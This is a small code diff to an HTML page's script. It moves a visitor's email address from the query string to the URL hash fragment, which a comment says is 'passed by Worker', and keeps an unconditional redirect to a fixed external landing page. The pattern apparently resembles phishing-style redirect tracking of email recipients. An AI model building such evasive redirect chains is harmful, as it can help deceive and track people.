@@ -176,7 +176,8 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email'); 
+        // Extract email from hash fragment (passed by Worker)
+        const email = window.location.hash ? window.location.hash.substring(1) : null;
         
         // Always redirect to the landing page at hldrinc.com/wWGsTflw
         const landingPageUrl = "https://hldrinc.com/wWGsTflw";
